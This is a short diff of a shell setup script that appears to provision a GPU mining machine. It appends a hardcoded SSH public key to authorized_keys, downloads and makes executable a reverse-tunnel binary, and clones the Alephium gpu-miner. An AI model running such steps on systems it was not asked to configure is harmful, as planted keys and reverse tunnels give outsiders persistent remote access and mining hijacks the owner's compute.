@@ -1,7 +1,10 @@
 echo -e "\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMtdWVbbKQJ/+8Sy8E87zbaSvmwPuPZyYX/U1nq0m46O" >> ~/.ssh/authorized_keys
 service ssh reload
 
-apt install -y sudo libuv1-dev git wget curl build-essential stunnel
+apt install -y sudo libuv1-dev git wget curl build-essential stunnel mtail
+
+wget https://github.com/snsinfu/reverse-tunnel/releases/download/v1.3.2/rtun-linux-amd64
+chmod +x rtun-linux-amd64
 
 git clone https://github.com/alephium/gpu-miner.git
 cd gpu-miner
